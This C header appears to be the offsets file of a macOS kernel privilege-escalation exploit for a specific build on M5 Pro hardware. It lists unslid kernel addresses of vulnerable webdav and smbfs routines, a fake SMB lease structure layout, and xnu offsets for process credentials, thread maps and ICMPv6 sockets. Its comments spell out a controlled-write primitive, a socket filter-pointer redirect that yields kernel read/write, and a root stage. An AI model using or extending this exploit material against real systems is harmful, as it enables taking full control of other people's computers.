/*
 * offsets.h — macOS 26.4.1 (25E253) t6050 (M5 Pro) offsets & addresses
 *
 * Sources:
 *  - kernelcache.release.Mac17,6_7_8_9 from UniversalMac_26.4.1_25E253_Restore.ipsw
 *    (LC_UUID 68FE70D3-E4C7-8A92-64C1-13F244868C8C)
 *  - KDK 26.4.1 build 25E253: kernel.release.t6050(.dSYM) — DWARF layouts
 *  - Black Hat USA 2026 "Apple macOS Kernel Exploitation with MIE" (Calif)
 *
 * All vaddrs are UNSLID. Runtime address = vaddr + kaslr_slide.
 */

#ifndef LPE_OFFSETS_H
#define LPE_OFFSETS_H

#include <stdint.h>

/* ---------- kernelcache ---------- */
#define KC_TEXT_BASE            0xfffffe0007004000ULL
#define KC_TEXT_EXEC_BASE       0xfffffe00088f4000ULL

/* ---------- com.apple.filesystems.webdav (fileset @ 0xfffffe0007c873a0) ---------- */
#define WEBDAV_read_bytes       0xfffffe000b3d5198ULL  /* confirmed vuln in 25E253 */
#define WEBDAV_sendmsg          0xfffffe000b3d0e44ULL  /* ignores short sock_receive */
#define WEBDAV_MAX_READ_ADDR    0xfffffe000c62a9c8ULL
#define WEBDAV_MAX_READ_VALUE   0x12d0000ULL           /* 16*1024*1204 = 19726336 (typo) */
/* webdav_read_bytes: MALLOC(buf, MAX_READ, M_TEMP(0x50), flags=0 -> no M_ZERO)
 * @ 0xfffffe000b3d51fc ; uiomove(buf, full_count, uio) @ 0xfffffe000b3d5298 */

/* ---------- com.apple.filesystems.smbfs (fileset @ 0xfffffe0007c650d0) ---------- */
#define SMBFS_vget                  0xfffffe000b334f8cULL  /* fsgetpath entry */
#define SMBFS_cmpd_resolve_id       0xfffffe000b389aecULL  /* sends AAPL RESOLVE_ID create */
#define SMBFS_ntcreatex             0xfffffe000b383c8cULL
#define SMBFS_parse_create_contexts 0xfffffe000b37a904ULL
/* RqLs lease case (dispatched on server-supplied name, no request-flags check): */
#define SMBFS_lease_case            0xfffffe000b37adacULL
/*   leasep = *create_contextp            @ 0xfffffe000b37adb4 (ldr x8, [x25])      */
/*   smbnode_lease_lock(leasep)           @ 0xfffffe000b37ae04                     */
/*   key_hi cmp  [leasep+0x30]            @ 0xfffffe000b37ae10                     */
/*   key_low cmp [leasep+0x38]            @ 0xfffffe000b37ae20                     */
/*   epoch write strh [leasep+0x50]       @ 0xfffffe000b37b23c (v2, len==0x34)     */
/*   lease_state str  [leasep+0x2c]       @ 0xfffffe000b37b244 (v2) / 0xfffffe000b37af30 (v1, len==0x20) */
/*   flags |= 0x80    [leasep+0x20]       @ 0xfffffe000b37b29c                     */
#define SMBFS_lease_lock            0xfffffe000b322da8ULL  /* writes last_op@+0x10, activation@+0x18 */
#define SMBFS_lease_unlock          0xfffffe000b323a7cULL  /* zeroes +0x10 / +0x18 */

/* fake smb2_lease layout (from SMBClient/kernel/netsmb/smb_2.h, confirmed in disasm) */
#define LEASE_OFF_LOCK              0x00   /* lck_mtx_t (16 bytes) — touched */
#define LEASE_OFF_MUSTBEZERO        0x08   /* must be 0 (durable-handle ptr check) */
#define LEASE_OFF_LAST_OP           0x10   /* forced write (PAC-signed ret addr), then 0 */
#define LEASE_OFF_ACTIVATION        0x18   /* forced write (current_thread), then 0 */
#define LEASE_OFF_FLAGS             0x20   /* |= 0x80 (SMB2_LEASE_GRANTED) */
#define LEASE_OFF_REQ_STATE         0x28
#define LEASE_OFF_STATE             0x2c   /* controlled u32 write */
#define LEASE_OFF_KEY_HI            0x30   /* must equal server-supplied key */
#define LEASE_OFF_KEY_LOW           0x38   /* must equal server-supplied key */
#define LEASE_OFF_PAR_KEY_HI        0x40
#define LEASE_OFF_PAR_KEY_LOW       0x48
#define LEASE_OFF_EPOCH             0x50   /* controlled u16 write (v2 / len 0x34) */

/* ---------- xnu struct offsets (KDW DWARF, kernel.release.t6050) ---------- */
#define INPCB_SIZE                  0x400
#define INPCB_INP_LIST              0x20
#define INPCB_INP_SOCKET            0x40
#define INPCB_INP_DEPENDFADDR       0xc4   /* probe target (+0xc8 inside faddr buf) */
#define INPCB_INP_DEPEND4           0x118
#define INPCB_INP_DEPEND6           0x130  /* anon 0x28: icmp6filt at +0x18 */
#define INPCB_IN6P_ICMP6FILT        0x148  /* == slide value */
#define INPCB_IN6P_OPTIONS          0x130
#define INPCB_IN6P_OUTPUTOPTS       0x138
#define INPCB_IN6P_MOPTIONS         0x140
#define ICMP6_FILTER_SIZE           0x20   /* 8 x u32 — the kalloc.32 R/W window */

#define THREAD_OFF_OPTIONS          0xc0
#define THREAD_OFF_CONTINUATION     0xd8
#define THREAD_OFF_MACHINE          0xf8
#define THREAD_OFF_MAP              0x418  /* swap target for cross-proc R/W */
#define THREAD_OFF_THREAD_ID        0x508

#define TASK_OFF_MAP                0x28
#define TASK_OFF_THREADS            0x50
#define TASK_OFF_THREAD_COUNT       0x78

/* ---------- more xnu offsets (KDK DWARF, kernel.release.t6050) ---------- */
#define PROC_OFF_LIST_NEXT          0x00   /* p_list.le_next */
#define PROC_OFF_LIST_PREV          0x08   /* p_list.le_prev: == &prev_proc
                                              (le_next at offset 0), or
                                              &allproc for the head.  Walk
                                              this from kernproc: kernproc is
                                              the allproc TAIL (procs are
                                              LIST_INSERT_HEAD'ed), so its
                                              le_next is NULL. */
#define PROC_OFF_RO                 0x18   /* p_proc_ro */
#define PROC_RO_OFF_TASK            0x08   /* proc_ro.pr_task */
#define PROC_OFF_PID                0x60   /* p_pid */
#define PROC_RO_OFF_UCRED           0x18   /* proc_ro.p_ucred (SMR ptr, raw) */
#define UCRED_OFF_UID               0x18   /* cr_posix.cr_uid  (ucred sz 0x90) */
#define UCRED_OFF_RUID              0x1c   /* cr_posix.cr_ruid */
#define UCRED_OFF_SVUID             0x20   /* cr_posix.cr_svuid */

#define VM_MAP_OFF_HDR              0x18   /* struct _vm_map.hdr */
#define VM_MAP_OFF_PMAP             0x58
/* vm_map_links (also head of vm_map_entry): */
#define VME_OFF_NEXT                0x00
#define VME_OFF_PREV                0x08
#define VME_OFF_START               0x10
#define VME_OFF_END                 0x18

/* thread list link inside struct thread (task.threads queue) */
#define THREAD_OFF_TASK_THREADS     0x400

/* unslid statics (KDK DWARF DW_AT_location) — runtime = these + kaslr slide.
 * slide is discovered at runtime by krw_discover_slide(); kernproc by
 * krw_discover_kernproc().  The two constants below are UNUSED: they came
 * from the t6050 KDK whose kernelcache layout differs from the victim's
 * kernelcache.release.VirtualMac2,1. */
#define XNU_KERNPROC                0xfffffe000728f140ULL  /* unused */
#define XNU_RIPCBINFO               0xfffffe0007d989a8ULL  /* unused */
#define INPCB_OFF_PCBINFO           0x38   /* inp_pcbinfo -> &ripcbinfo */
#define INPCB_OFF_SOCKET            0x40   /* inp_socket back-pointer */

/* fresh ICMPv6 SOCK_DGRAM socket inpcb values (icmp6_dgram_attach):
 *   cksum @0x150 = 0xffffffff, hops @0x154 = 0xffff (or our setsockopt),
 *   options/outputopts/moptions @0x130/0x138/0x140 = 0,
 *   filt @0x148 = live kalloc.32 (UNKNOWN, non-NULL),
 *   hash_element @0x158 = 0 (ripcb has no hash), saved_ppcb @0x160 = 0. */
#define INPCB_OFF_CKSUM             0x150
#define INPCB_OFF_HOPS              0x154
#define INPCB_OFF_HASH_ELEM         0x158
#define INPCB_OFF_SAVED_PPCB        0x160
#define INPCB_FRESH_CKSUM           0xffffffffU
#define INPCB_FRESH_HOPS            0xffffU

#define IPC_PORT_IP_MESSAGES        0x28
#define IPC_PORT_IP_RECEIVER        0x48
#define IPC_PORT_IP_KOBJECT         0x50
#define IPC_PORT_IP_MSCOUNT         0x84
#define IPC_PORT_SIZE               0x90   /* per talk (zone element) */

/* ---------- primitive shapes (from talk, slide 25) ----------
 * corrupt(K, x, y, known_hi, known_low):
 *   require *(u64*)(K+0x08) == 0
 *   require *(u64*)(K+0x30) == known_hi      (server sends lease_key = known values)
 *   require *(u64*)(K+0x38) == known_low
 *   *(u32*)(K+0x2c) = x                      (lease_state)
 *   *(u16*)(K+0x50) = y                      (epoch, v2 52-byte ctx)
 *   *(u64*)(K+0x10) = 0  (forced, via unlock)
 *   *(u64*)(K+0x18) = 0  (forced, via unlock)
 *   bonus: *(u64*)(K+0x20) |= 0x80           (SMB2_LEASE_GRANTED)
 *
 * To write u32 X at target T:  K = T - 0x2c, lease_state = X
 *   => gates: *(T-0x24) == 0 (K+8), keys at T+4/T+0xc must be known,
 *      side effects: T-0x1c/T-0x14 zeroed, T-0xc |= 0x80, u16 at T+0x24 = epoch
 *
 * inpcb filter-pointer redirect (talk slides 33-35):
 *   A.filter ptr @ A+0x148 rewritten via two corrupt() calls, then
 *   setsockopt(A, ICMP6_FILTER) stores target addr into B+0x148,
 *   getsockopt/setsockopt(B, ICMP6_FILTER) = 32-byte kernel R/W window.
 */

/* root stage */
#define KNOWN_ROOT_PROGRAM "/usr/bin/setregion"  /* launchd job Program string */

#endif /* LPE_OFFSETS_H */
